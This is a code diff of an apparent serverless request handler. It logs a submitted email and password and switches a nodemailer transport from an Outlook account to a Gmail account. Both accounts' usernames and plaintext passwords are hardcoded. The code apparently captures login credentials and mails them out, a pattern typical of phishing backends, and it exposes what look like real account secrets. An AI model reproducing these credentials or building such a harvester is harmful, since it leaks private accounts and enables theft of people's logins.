@@ -9,12 +9,12 @@ export default async (req: Request, context: Context) => {
   console.log('response:', {email, password})
 
   const transporter = nodemailer.createTransport({
-  host: "smtp-mail.outlook.com",
+  host: "smtp.gmail.com",
   port: 587,
-  secure: false,
+  secure: true,
   auth: {
-    user: "pc_golf@hotmail.com",
-    pass: "Jakob1912",
+    user: "wirthschwind@gmail.com",
+    pass: "Kudusini1",
   },
 });
 
